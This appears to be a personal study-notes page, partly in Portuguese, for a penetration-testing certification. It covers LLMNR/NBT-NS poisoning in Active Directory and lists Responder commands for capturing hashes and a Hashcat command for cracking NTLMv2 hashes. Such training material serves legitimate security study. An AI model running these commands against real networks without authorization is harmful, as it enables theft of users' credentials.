> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/cpts/active-directory-enumeration-and-attacks/llmnr-nbt-ns-poisoning-from-linux.md).

# LLMNR/NBT-NS Poisoning - from Linux

#### Responder

* Helping&#x20;

```sh
responder -h
```

* **Iniciando o Responder com as configurações padrão**

```sh
sudo responder -I ligolo
```

* **Quebrando um hash NTLMv2 com Hashcat**

```sh
hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt
```
